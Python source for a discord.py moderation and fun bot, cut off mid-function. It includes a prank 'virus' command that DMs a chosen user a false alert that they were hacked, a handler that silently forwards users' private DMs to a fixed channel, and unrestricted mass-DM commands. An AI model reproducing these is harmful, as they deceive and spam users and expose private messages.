import discord
from discord.ext import commands
from discord.ext.commands.cooldowns import BucketType
import asyncio
import colorsys
import random
import platform
from discord import Game, Embed, Color, Status, ChannelType
import re
import os
import functools
import time
import datetime
import requests
import json
import aiohttp

Forbidden= discord.Embed(title="Permission Denied", description="1) Please check whether you have permission to perform this action or not. \n2) Please check whether my role has permission to perform this action in this channel or not. \n3) Please check my role position.", color=0x00ff00)
client = commands.Bot(description="Master Nova", command_prefix=commands.when_mentioned_or("N!"), pm_help = True)
client.remove_command('help')

async def status_task():
    while True:
        await client.change_presence(game=discord.Game(name='for N!help'))
        await asyncio.sleep(5)
        await client.change_presence(game=discord.Game(name='with '+str(len(set(client.get_all_members())))+' users'))
        await asyncio.sleep(5)
        await client.change_presence(game=discord.Game(name='in '+str(len(client.servers))+' servers'))
        await asyncio.sleep(5)

left = '⏪'
right = '⏩'
r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
general1=discord.Embed(title="General Commands | Page 1", description="**__N!donate__** \nSends donation link \n\n**__N!invite__** or **__N!authlink__** \nUse it to invite our bot to your server\n**__N!google__**\n Use it like- ``N!google <anything>`` to google anything\n\n**__N!youtube__**\nUse it like- ``N!youtube <anything>`` to search anything on youtube\n\n**__N!membernames__**\nUse it to get member names in dm\n\n**__N!invites__** \nUse it like ``N!invites @user`` or ``N!invite`` for get invites done by you/tagged person in server. \n__Note:__**If bot does not responds that means you do not have invited any member on that server.**\n\n**__N!remind__**\nUse it like ``N!remind <time in minutes> <text like what to remind>`` Example: ``N!remind to Drink water``", color = discord.Color((r << 16) + (g << 8) + b))
general2=discord.Embed(title="General Commands | Page 2", description="**__N!serverinvite__** \nUse it to get server invite link.\n\n**__N!avatar__**\nUse it like ``N!avatar or N!avatar @user``\n\n**__N!ping__**\nUse it to check ping of bot\n\n**__N!enterme__**\nUse it like ``N!enterme <giveaway channel>`` to enter in a giveaway running in a particular channel\n\n**__N!poll__**\nUse it like ``N!poll Question Option1 Option2 ..... Option9``.\n\n**__N!github__**\nUse it like- ``N!github uksoftworld``\n\n**__mv!bottutorial__**\nUse it like ``N!bottutorial <tutorial name by Thunder PlayZ>``\n\n**__N!dyno__**\nUse it like ``mv!dyno <dyno command name>``\n\n**__N!happybirthday @user__**\nTo wish someone happy birthday\n\n**__N!verify__**Use it to get verified role. Note- It needs proper setup.", color = discord.Color((r << 16) + (g << 8) + b))
mod1=discord.Embed(title="Admin and Mod Commands | Page 1", description="**__N!partner(Admin permission required) (Cooldown of 12hours)__** \nUse it like ``N!partner <partnership description>`` to partner with many servers witch are connected with Master Nova \n\n**__N!dm(Admin permission required)__** \nUse it like ``N!dm @user <text>`` to dm user from bot \n\n**__N!say(Admin permission required)__**\nUse it like ``N!say <text>``\n\n **__N!showme(Requires a role named Giveaways)__**\n To see how many people are taking part in giveaway\n\n**__N!pickwinner(Requires a role named Giveaways)__**\nTo pick winner of currentmost giveaways\n\n**__N!embed(Admin permission required__**\nUse it like ``N!embed <text>``\n\n**__N!membercount(Kick members Permission Required)__** \n Use it to get membercount of server\n\n**__N!lock(Kick members Permission Required)__**\nUse it like ``N!lock #channel or N!lock`` to lock a channel\n\n**__N!unlock(Kick members Permission Required)__**\nUse it like ``N!unlock #channel or N!unlock`` to unlock a channel", color = discord.Color((r << 16) + (g << 8) + b))
mod2=discord.Embed(title="Admin and Mod Commands | Page 2", description="**__N!removemod(Admin Permission Required)__** \nUse it like ``N!removemod @user`` to remove him from mod. Note-You need Moderator role in your server below bot to use it.\n\n**__N!makemod(Admin Permission Required)__**\nUse it like ``N!makemod @user`` to make him mod. Note-You need Moderator role in your server below multiverse bot to use it.\n\n**__N!friend(Admin Permission Required)__**\nUse it like ``N!friend @user`` to give anyone Friend of Owner role\n\n**__N!role(Manage Roles Permission Required)__**\nUse it like ``N!role @user <rolename>``.\n\n**__N!setnick(Manage nickname permission required)__**\nUse it like ``N!setnick @user <New nickname>`` to change the nickname of tagged user.\n\n**__N!english(Kick members Permission Required)__**\nUse it like ``N!english @user`` when someone speaks languages other than English.\n\n**__N!serverinfo(Kick members Permission Required)__**\nUse it like ``N!serverinfo`` to get server info\n\n**__N!userinfo(Kick members Permission Required)__**\nUse it like ``N!userinfo @user`` to get some basic info of tagged user.", color = discord.Color((r << 16) + (g << 8) + b))
mod3=discord.Embed(title="Admin and Mod Commands | Page 3", description="**__N!unbanall(Unban members Permission Required)__** \nUse it like ``N!unbanall`` to unban all members\n\n**__N!kick(Kick members Permission Required)__**\nUse it like ``N!kick @user`` to kick any user\n\n**__N!muteinchannel(Ban members Permission Required)__**\nUse it like ``N!muteinchannel @user <time in minutes>`` Example- ``N!muteinchannel @user 1`` to mute user for 1min.\n\n**__N!unmuteinchannel(Ban members Permission Required)__**\nUse it like ``N!unmuteinchannel @user`` to unmute user from that channel.\n\n**__N!roles(Kick members Permission Required)__**\nUse it to check roles present in server.\n\n**__N!purge(Manage Messages Permission Required)__**\nUse it like ``N!purge <number>`` to clear any message.\n\n**__N!mute(Mute members Permission Required)__**\nUse it like ``N!mute @user <time in minutes>`` to mute any user. **Note-You need to add Muted role in your server if it is not already there also you must need to change permission of all channels and disable send_message permission for that role.**\n\n**__N!unmute(Mute members Permission Required)__**\nUse it like ``N!unmute @user`` to unmute anyone.", color = discord.Color((r << 16) + (g << 8) + b))
mod4=discord.Embed(title="Admin and Mod Commands | Page 4", description="**__N!ban(Ban members Permission Required)__** \nUse it like ``N!ban @user`` to ban any user\n\n**__N!rules(Kick members Permission Required)__**\nUse it like ``N!rules @user <violation type>`` to warn user\n\n**__N!warn(Kick members Permission Required)__**\nUse it like ``N!warn @user <violation type>`` to warn any user.\n\n**__N!norole(Kick members Permission Required)__**\nUse it like ``N!norole @user`` to warn anyone if he/she asks for promotion.\n\n**__N!getuser(Kick members Permission Required)__**\nUse it like ``N!getuser rolename`` to get list of all users having a that role.\n\n**__N!roleinfo(Manage roles Permission Required)__**\nUse it like ``N!roleinfo <rolename>`` to get basic info about that role.\n\n**__N!addchannel(Administrator Permission Required)__**\nUse it like ``N!addchannel <channelname>`` to add that channel in server.\n\n**__N!delchannel(Administrator Permission Required)__**\nUse it like ``N!delchannel <channelname>`` to delete that channel in server.", color = discord.Color((r << 16) + (g << 8) + b))

gen_cmd = (general1, general2)
mod_cmd = (mod1, mod2, mod3, mod4)

def predicate(message, l, r):
    def check(reaction, user):
        if reaction.message.id != message.id or user == client.user:
            return False
        if l and reaction.emoji == left:
            return True
        if r and reaction.emoji == right:
            return True
        return False

    return check



@client.event
async def on_ready():
    print('Logged in as '+client.user.name+' (ID:'+client.user.id+') | Connected to '+str(len(client.servers))+' servers | Connected to '+str(len(set(client.get_all_members())))+' users')
    print('--------')
    print('--------')
    print('Started Our BOT')
    print('Created by King nova')
    client.loop.create_task(status_task())
    

@client.event
async def on_message(message):
    channel = client.get_channel('518710986799316992')
    if message.server is None and message.author != client.user:
        await client.send_message(channel, '{} : <@{}> : '.format(message.author.name, message.author.id) + message.content)
    await client.process_commands(message)

@client.event
async def on_reaction_add(reaction, user):
  if reaction.message.server is None:
      if reaction.emoji == '🇬':
          index = 0
          while True:
              msg = await client.send_message(user, embed=gen_cmd[index])
              l = index != 0
              r = index != len(gen_cmd) - 1
              if l:
                  await client.add_reaction(msg, left) 
              if r:
                  await client.add_reaction(msg, right)
              react, user = await client.wait_for_reaction(check=predicate(msg, l, r))
              if react.emoji == left:
                  index -= 1
              elif react.emoji == right:
                  index += 1
              await client.delete_message(msg)
      if reaction.emoji == '🇲':
          index = 0
          while True:
              msg = await client.send_message(user, embed=mod_cmd[index])
              l = index != 0
              r = index != len(mod_cmd) - 1
              if l:
                  await client.add_reaction(msg, left) 
              if r:
                  await client.add_reaction(msg, right)
              react, user = await client.wait_for_reaction(check=predicate(msg, l, r))
              if react.emoji == left:
                  index -= 1
              elif react.emoji == right:
                  index += 1
              await client.delete_message(msg)
    
      if reaction.emoji == '🏵':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Setup Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'Setting up Welcomer log(Admin Permission required) ',value ='Use N!setupwelcomer. It will add a welcome channel. Just put that channel in your desired category and it will send all logs there.',inline = False)
        embed.add_field(name = 'Setting up AutoPartner Channel(Admin Permission required)',value ='Using ``N!setuppartner`` command create a channel named thunder-partner and then you can use mv!partner to partner with other servers.',inline = False)
        embed.add_field(name = 'Setting up Giveaway feature(Manage roles permission required) ',value ='Just add a role named ``Giveaways`` and give that role to user who wanna be giveaway manager. Then use ``N!help`` and check giveaway commands.',inline = False)
        embed.add_field(name = 'Setting up Reaction Verification(Admin Permission required) ',value ='Just add a role named ``Verified`` then remove permission from everyone to send message in all channels. Also add permission of verified role to send message in chatting channels. Then use ``N!setreactionverify`` it will automatically add a channel and post information about verification. **__Note__** **Sometimes it does not sends message in channel named #verify-for-chatting when this command is used so reuse that command in such case**',inline = False)
        embed.add_field(name = 'Setting up Nova bot log(Admin Permission required) ',value ='Use ``N!setuplog`` and it will automatically add a log channel and log all stuffs there.',inline = False)
        react_message = await client.send_message(user,embed=embed)
        await asyncio.sleep(30)
        await client.delete_message(react_message)
      if reaction.emoji == '🎦':
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
        embed.set_author(name='Emoji Help')
        embed.set_image(url = 'https://image.ibb.co/caM2BK/help.gif')
        embed.add_field(name = 'N!wow',value ='WOW emoji <a:WOW:515854429485006848>',inline = False)
        embed.add_field(name = 'N!cat',value ='Cat emoji <a:agooglecat:516174312294842389>',inline = False)
        embed.add_field(name = 'N!surprised',value ='Surprised emoji <a:eyebigger:516174315058626560>',inline = False)
        embed.add_field(name = 'N!angry',value ='Angry emoji <a:angear:516174316950388772>',inline = False)
        embed.add_field(name = 'N!fearfromme',value ='Scary emoji <a:shiroeglassespush:516174320532193289>',inline = False)
        embed.add_field(name = 'N!dank',value ='DankMemer emoji <a:OnThaCoco:515853700682743809>',inline = False)
        embed.add_field(name = 'N!thinking1',value ='Think emoji1 <a:thinking:516183328613990400>',inline = False)
        embed.add_field(name = 'N!thinking2',value ='Think emoji2 <a:thinking2:516183323127709699>',inline = False)
        embed.add_field(name = 'N!happy',value ='Happy emoji <a:happy:516183323052212236>',inline = False)
        embed.add_field(name = 'N!santa',value ='Santa emoji <a:santa:517232271678504970>',inline = False)
        embed.add_field(name = 'N!lol',value ='LoL emoji <a:lol:517232283670020096>',inline = False)
        embed.add_field(name = 'N!love',value ='Love emoji <a:love:517232300912672774>',inline = False)
        embed.add_field(name = 'N!mad',value ='Mad emoji <a:mad:517232301176913951>',inline = False)
        embed.add_field(name = 'N!alien',value ='Alien emoji <a:alien:517232332663422986>',inline = False)
        embed.add_field(name = 'N!hi',value ='Saying Hi emoji <a:hi:517232279148429313>',inline = False)
        react_message = await client.send_message(user,embed=embed)
        await asyncio.sleep(30)
        await client.delete_message(react_message)
  else:
      if reaction.emoji == '🇻':
            role = discord.utils.get(user.server.roles, name='Verified')
            await client.add_roles(user, role)
	
@client.event
async def on_member_join(member):
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = discord.Embed(title=f'Welcome {member.name} to {member.server.name}', description='Do not forget to check rules and never try to break any one of them', color = discord.Color((r << 16) + (g << 8) + b))
            embed.add_field(name='__Thanks for joining__', value='**Hope you will be active here.**', inline=True)
            embed.set_thumbnail(url='https://media.giphy.com/media/OkJat1YNdoD3W/giphy.gif') 
            embed.set_image(url = member.avatar_url)
            embed.add_field(name='__Join position__', value='{}'.format(str(member.server.member_count)), inline=True)
            embed.add_field(name='Time of joining', value=member.joined_at)
            await client.send_message(channel, embed=embed) 
            role = discord.utils.get(member.server.roles, name='Verified')
            await asyncio.sleep(60)
            await client.add_roles(member, role)

@client.event
async def on_member_remove(member):
    for channel in member.server.channels:
        if channel.name == '★彡-welcome-彡★':
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = discord.Embed(title=f'{member.name} just left {member.server.name}', description='Bye bye 👋! We will miss you 😢', color = discord.Color((r << 16) + (g << 8) + b))
            embed.add_field(name='__User left__', value='**Hope you will be back soon 😕.**', inline=True)
            embed.add_field(name='Your join position was', value=member.joined_at)
            embed.set_thumbnail(url=member.avatar_url)
            await client.send_message(channel, embed=embed)

	
@client.command(pass_context=True)
async def tweet(ctx, usernamename:str, *, txt:str):
    url = f"https://nekobot.xyz/api/imagegen?type=tweet&username={usernamename}&text={txt}"
    async with aiohttp.ClientSession() as cs:
        async with cs.get(url) as r:
            res = await r.json()
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
            embed.set_image(url=res['message'])
            embed.title = "{} twitted: {}".format(usernamename, txt)
            await client.say(embed=embed)

	
@client.command(pass_context=True)
async def virus(ctx,user: discord.Member=None,*,hack=None):
    nome = ctx.message.author
    if not hack:
        hack = 'discord'
    else:
        hack = hack.replace(' ','_')
    channel = ctx.message.channel
    x = await client.send_message(channel, '``[▓▓▓                    ] / {}-virus.exe Packing files.``'.format(hack))
    await asyncio.sleep(1.5)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓                ] - {}-virus.exe Packing files..``'.format(hack))
    await asyncio.sleep(0.3)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {}-virus.exe Packing files...``'.format(hack))
    await asyncio.sleep(1.2)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {}-virus.exe Initializing code.``'.format(hack))
    await asyncio.sleep(1)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {}-virus.exe Initializing code..``'.format(hack))
    await asyncio.sleep(1.5)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {}-virus.exe Finishing.``'.format(hack))
    await asyncio.sleep(1)
    x = await client.edit_message(x,'``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {}-virus.exe Finishing..``'.format(hack))
    await asyncio.sleep(1)
    x = await client.edit_message(x,'``Successfully downloaded {}-virus.exe``'.format(hack))
    await asyncio.sleep(2)
    x = await client.edit_message(x,'``Injecting virus.   |``')
    await asyncio.sleep(0.5)
    x = await client.edit_message(x,'``Injecting virus..  /``')
    await asyncio.sleep(0.5)
    x = await client.edit_message(x,'``Injecting virus... -``')
    await asyncio.sleep(0.5)
    x = await client.edit_message(x,'``Injecting virus....\``')
    await client.delete_message(x)
    await client.delete_message(ctx.message)
        
    if user:
        await client.say('`{}-virus.exe` successfully injected into **{}**\'s system.'.format(hack,user.name))
        await client.send_message(user,'**Alert!**\n``You may have been hacked. {}-virus.exe has been found in your system\'s operating system.\nYour data may have been compromised. Please re-install your OS immediately.``'.format(hack))
    else:
        await client.say('**{}** has hacked himself ¯\_(ツ)_/¯.'.format(name.name))
        await client.send_message(name,'**Alert!**\n``You may have been hacked. {}-virus.exe has been found in your system\'s operating system.\nYour data may have been compromised. Please re-install your OS immediately.``'.format(hack))
		
@client.command(pass_context = True)
async def invites(ctx,*,user:discord.Member=None):
    invite = await client.invites_from(ctx.message.server)
    if user is None:
        for invite in invite:
          if invite.inviter == ctx.message.author:
              r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
              embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
              embed.add_field(name = 'Link used for inviting:',value =f'{invite.url}'.format(), inline=False)
              embed.add_field(name = 'Invites from this link:',value =f'{invite.uses}', inline=False)
              embed.add_field(name = 'Created at:',value =f'{invite.created_at}', inline=False)
              embed.add_field(name = 'Channel:',value =f'{invite.channel}', inline=False)
              embed.add_field(name = 'ID:',value =f'{invite.id}', inline=False)
              await client.say(embed=embed)
              
    else:
        for invite in invite:
          if invite.inviter == user:
              r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
              embed = discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
              embed.add_field(name = 'Link used for inviting:',value =f'{invite.url}'.format(), inline=False)
              embed.add_field(name = 'Invites from this link:',value =f'{invite.uses}', inline=False)
              embed.add_field(name = 'Created at:',value =f'{invite.created_at}', inline=False)
              embed.add_field(name = 'Channel:',value =f'{invite.channel}', inline=False)
              embed.add_field(name = 'ID:',value =f'{invite.id}', inline=False)
              await client.say(embed=embed)
              
		
@client.command(pass_context=True)
async def lovedetect(ctx, user: discord.Member = None, *, user2: discord.Member = None):
    shipuser1 = user.name
    shipuser2 = user2.name
    useravatar1 = user.avatar_url
    useravatar2s = user2.avatar_url
    self_length = len(user.name)
    first_length = round(self_length / 2)
    first_half = user.name[0:first_length]
    usr_length = len(user2.name)
    second_length = round(usr_length / 2)
    second_half = user2.name[second_length:]
    finalName = first_half + second_half
    score = random.randint(0, 100)
    filled_progbar = round(score / 100 * 10)
    counter_ = '█' * filled_progbar + '‍ ‍' * (10 - filled_progbar)
    url = f"https://nekobot.xyz/api/imagegen?type=ship&user1={useravatar1}&user2={useravatar2s}"
    async with aiohttp.ClientSession() as cs:
        async with cs.get(url) as r:
            res = await r.json()
            r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
            embed = discord.Embed(title=f"{shipuser1} ❤ {shipuser2} Love each others", description=f"Love\n`{counter_}` Score:**{score}% **\nLoveName:**{finalName}**", color = discord.Color((r << 16) + (g << 8) + b))
            embed.set_image(url=res['message'])
            await client.say(embed=embed)
		
@client.command(pass_context = True)
async def dmall(ctx, *, msg: str):
    for server_member in ctx.message.server.members:
      await client.send_message(server_member, msg)
      await client.delete_message(ctx.message)

	
@client.command(pass_context = True)
async def servers(ctx):
  servers = list(client.servers)
  await client.say(f"Connected on {str(len(servers))} servers:")
  await client.say('\n'.join(server.name for server in servers))
	
@client.command(pass_context=True)
async def serverinvite(ctx):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    invitelinknew = await client.create_invite(destination = ctx.message.channel, xkcd = True, max_uses = 100)
    embedMsg=discord.Embed(color = discord.Color((r << 16) + (g << 8) + b))
    embedMsg.add_field(name="Discord Invite Link", value=invitelinknew)
    embedMsg.set_footer(text="Copyright @ kaK Soft")
    await client.send_message(ctx.message.channel, embed=embedMsg)
	
@client.command(pass_context = True)
async def rainbow(ctx):
    role = discord.utils.get(ctx.message.server.roles, name='Rainbow')
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    await client.edit_role(ctx.message.server, role, color = discord.Color((r << 16) + (g << 8) + b))
	
@client.command(pass_context = True)
async def ping(ctx):
    if ctx.message.author.bot:
      return
    else:
      channel = ctx.message.channel
      t1 = time.perf_counter()
      await client.send_typing(channel)
      t2 = time.perf_counter()
      await client.say("Ping: {}ms".format(round((t2-t1)*1000)))

@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def announce(ctx, channel: discord.Channel=None, *, msg: str):
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed=discord.Embed(title="Announcement", description="{}".format(msg), color = discord.Color((r << 16) + (g << 8) + b))
    await client.send_message(channel, embed=embed)
    await client.delete_message(ctx.message)
	
@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def delchannel(ctx, channel: discord.Channel=None):
    if channel is None:
        await client.delete_channel(ctx.message.channel)
        await client.send_message(ctx.message.author, "{} channel has been deleted in {}".format(ctx.message.channel.name, ctx.message.server.name))
    else:
        await client.delete_channel(channel)
        await client.say("{} channel has been deleted.".format(channel.name))


@client.command(pass_context = True)
@commands.has_permissions(administrator=True) 
async def addchannel(ctx, channel: str=None):
    server = ctx.message.server
    if channel is None:
        await client.say("Please specify a channel name")
    else:
        everyone_perms = discord.PermissionOverwrite(send_messages=None, read_messages=None)
        everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
        await client.create_channel(server, channel, everyone)
        await client.say("{} channel has been created.".format(channel))

	
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def mute(ctx, member: discord.Member=None, mutetime=None):
    if member is None:
        await client.say('Please specify member i.e. Mention a member to mute. Example-``N!mute @user <time in minutes>``')
        return
    if mutetime is None:
        await client.say('Please specify time i.e. Mention a member to mute with time. Example-``N!mute @user <time in minutes>``')
        return
    if member.server_permissions.kick_members:
        await client.say('**You cannot mute admin/moderator!**')
        return
    if ctx.message.author.bot:
      return
    else:
      mutetime =int(mutetime)
      mutetime = mutetime * 60
      output = mutetime/60
      role = discord.utils.get(member.server.roles, name='Muted')
      await client.add_roles(member, role)
      await client.say("Muted **{}**".format(member.name))
      await client.send_message(member, "You are muted by {0} for {1} Minutes".format(ctx.message.author, output))
      for channel in member.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="User Muted!", description="**{0}** was muted by **{1}** for {2} minutes!".format(member, ctx.message.author, output), color=0x37F60A)
            await client.send_message(channel, embed=embed)
            await asyncio.sleep(mutetime)
            await client.remove_roles(member, role)
            await client.say("Unmuted **{}**".format(member.name))
            embed=discord.Embed(title="User unmuted!", description="**{0}** was unmuted!".format(member, ctx.message.author), color=0xFD1600)
            await client.send_message(channel, embed=embed)
      else:
          mutetime =int(mutetime)
          mutetime = mutetime * 60
          output = mutetime/60
          role = discord.utils.get(member.server.roles, name='Muted')
          await client.add_roles(member, role)
          await client.say("Muted **{}**".format(member.name))
          await client.send_message(member, "You are muted by {0} for {1} Minutes".format(ctx.message.author, output))
          for channel in member.server.channels:
              if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
                  embed=discord.Embed(title="User Muted!", description="**{0}** was muted by **{1}** for {2} minutes!".format(member, ctx.message.author, output), color=0x37F60A)
                  await client.send_message(channel, embed=embed)
                  await asyncio.sleep(mutetime)
                  await client.remove_roles(member, role)
                  await client.say("Unmuted **{}**".format(member.name))
                  embed=discord.Embed(title="User unmuted!", description="**{0}** was unmuted!".format(member, ctx.message.author), color=0xFD1600)
                  await client.send_message(channel, embed=embed)

@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def lock(ctx, channelname: discord.Channel=None):
    overwrite = discord.PermissionOverwrite(send_messages=False, read_messages=True)
    if not channelname:
        role = discord.utils.get(ctx.message.server.roles, name='@everyone')
        await client.edit_channel_permissions(ctx.message.channel, role, overwrite)
        await client.say("Channel locked by: {}".format(ctx.message.author))
    else:
        role = discord.utils.get(ctx.message.server.roles, name='@everyone')
        await client.edit_channel_permissions(channelname, role, overwrite)
        await client.say("Channel locked by: {}".format(ctx.message.author))
	
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def unlock(ctx, channelname: discord.Channel=None):
    overwrite = discord.PermissionOverwrite(send_messages=None, read_messages=True)
    if not channelname:
        role = discord.utils.get(ctx.message.server.roles, name='@everyone')
        await client.edit_channel_permissions(ctx.message.channel, role, overwrite)
        await client.say("Channel unlocked by: {}".format(ctx.message.author))
    else:
        role = discord.utils.get(ctx.message.server.roles, name='@everyone')
        await client.edit_channel_permissions(channelname, role, overwrite)
        await client.say("Channel unlocked by: {}".format(ctx.message.author))
	
@client.command(pass_context = True)
async def meme(ctx):
    choices = ['https://img.memecdn.com/english_o_869587.webp', 'https://img.memecdn.com/everybody-knows-muricans-don-amp-039-t-speak-english-the-same-way-mexicans-don-amp-039-t-speak-spanish_c_7233205.webp', 'https://img.memecdn.com/english-reaction-when-they-heard-about-eu_c_6994013.webp', 'https://images3.memedroid.com/images/UPLOADED393/5b0c3ee92799f.jpeg' , 'https://images7.memedroid.com/images/UPLOADED850/5b0c2d7dd6049.jpeg', 'https://images7.memedroid.com/images/UPLOADED905/5b0c30c468fa8.jpeg', 'https://images7.memedroid.com/images/UPLOADED726/5b0c2d4c5f288.jpeg', 'https://images7.memedroid.com/images/UPLOADED936/5b0c2a90adbe7.jpeg', 'https://images7.memedroid.com/images/UPLOADED764/5b0c1e491c669.jpeg', 'https://images3.memedroid.com/images/UPLOADED922/5b0c284b71cd0.jpeg', 'https://images3.memedroid.com/images/UPLOADED207/5b0c265a58cf4.jpeg', 'https://images7.memedroid.com/images/UPLOADED920/5b0c06813741a.jpeg', 'https://images3.memedroid.com/images/UPLOADED46/5a91c871e61f1.jpeg', 'https://images7.memedroid.com/images/UPLOADED737/5a91c7f234bd2.jpeg', 'https://images7.memedroid.com/images/UPLOADED757/5a91bd39e1323.jpeg', 'https://images7.memedroid.com/images/UPLOADED963/5a91b4f7aba7e.jpeg', 'https://images7.memedroid.com/images/UPLOADED794/5a91ac0900506.jpeg', 'https://images3.memedroid.com/images/UPLOADED188/5a91aa326ad4e.jpeg']
    r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
    embed = discord.Embed(title='Meme', description='<Lol What The Duck>', color = discord.Color((r << 16) + (g << 8) + b))
    embed.set_thumbnail(url='') 
    embed.set_image(url = random.choice(choices))
    await client.send_typing(ctx.message.channel)
    await client.send_message(ctx.message.channel, embed=embed) 
		
@client.command(pass_context = True)
async def avatar(ctx, user: discord.Member=None):
    if user is None:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=f'Avatar', description='Avatar is profile picture of a user in discord', color = discord.Color((r << 16) + (g << 8) + b))
        embed.add_field(name='User: {}'.format(ctx.message.author.name), value='Avatar:', inline=True)
        embed.set_thumbnail(url='https://cdn.discordapp.com/icons/489333893988745217/eb022a7023d013bec656cd7b94d6d6c1.png') 
        embed.set_image(url = ctx.message.author.avatar_url)
        await client.say(embed=embed)
    else:
        r, g, b = tuple(int(x * 255) for x in colorsys.hsv_to_rgb(random.random(), 1, 1))
        embed = discord.Embed(title=f'Avatar', description='Avatar is profile picture of a user in discord', color = discord.Color((r << 16) + (g << 8) + b))
        embed.add_field(name='User: {}'.format(user.name), value='Avatar:', inline=True)
        embed.set_thumbnail(url='https://cdn.discordapp.com/icons/489333893988745217/eb022a7023d013bec656cd7b94d6d6c1.png') 
        embed.set_image(url = user.avatar_url)
        await client.say(embed=embed)

@client.command(pass_context=True)
async def botdm(ctx, user: discord.Member, *, msg: str):
    await client.send_typing(user)
    await client.send_message(user, msg)
	
	

@client.command(pass_context = True)
async def rolldice(ctx):
    choices = ['1', '2', '3', '4', '5', '6']
    color = discord.Color(value=0x00ff00)
    em = discord.Embed(color=color, title='Rolled! (1 6-sided die)', description=random.choice(choices))
    await client.send_typing(ctx.message.channel)
    await client.say(embed=em)

   
@client.command(pass_context = True)
@commands.has_permissions(administrator = True)
async def dm(ctx, user: discord.Member, *, msg: str):
    try:
        await client.send_message(user, msg)
        await client.delete_message(ctx.message)          
        await client.say("Success! Your DM has made it! :white_check_mark: ")
    except discord.ext.commands.MissingPermissions:
        await client.say("Aw, come on! You thought you could get away with DM'ing people without permissions.")
    except:
        await client.say("Error :x:. Make sure your message is shaped in this way: N!dm [tag person] [msg]")
	
@client.command(pass_context = True)
async def flipcoin(ctx):
    choices = ['Heads', 'Tails', 'Coin self-destructed']
    color = discord.Color(value=0x00ff00)
    em=discord.Embed(color=color, title='Flipped a coin!')
    em.description = random.choice(choices)
    await client.send_typing(ctx.message.channel)
    await client.say(embed=em)

	
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
async def unmute(ctx, member: discord.Member=None):
    if member is None:
      await client.say('Please specify member i.e. Mention a member to unmute. Example- ``N!unmute @user``')
    if ctx.message.author.bot:
      return
    else:
      role = discord.utils.get(member.server.roles, name='Muted')
      await client.remove_roles(member, role)
      await client.say("Unmuted **{}**".format(member))
      for channel in member.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="User unmuted!", description="**{0}** was unmuted by **{1}**!".format(member, ctx.message.author), color=0xFD1600)
            await client.send_message(channel, embed=embed)
     
@client.command(pass_context = True)
@commands.has_permissions(kick_members=True) 
@commands.cooldown(rate=5,per=86400,type=BucketType.user) 
async def access(ctx, member: discord.Member=None):
    if member is None:
      await client.say("Please specify a member to give access to him. Example- ``N!access @user``")
    if ctx.message.author.bot:
      return
    else:
      role = discord.utils.get(member.server.roles, name='Access')
      await client.add_roles(member, role)
      await client.say("Gave access to {}".format(member))
      for channel in member.server.channels:
        if channel.name == '╰☆☆-Master Nova-log-☆☆╮':
            embed=discord.Embed(title="User Got Access!", description="**{0}** got access from **{1}**!".format(member, ctx.message.author), color=0x020202)
            await client.send_message(channel, embed=embed)
            await asyncio.sleep(45*60)
            await client.remove_roles(member, role)
	   
@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def setupwelcomer(ctx):
    if ctx.message.author.bot:
      return
    else:
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
      everyone = discord.ChannelPermissions(target=server.default_role, overwrite=everyone_perms)
      await client.create_channel(server, '★彡-welcome-彡★',everyone)

@client.command(pass_context = True)
@commands.has_permissions(administrator=True)
async def setuppartner(ctx):
    if ctx.message.author.bot:
      return
    else:
      server = ctx.message.server
      everyone_perms = discord.PermissionOverwrite(send_messages=False, read_messages=True)
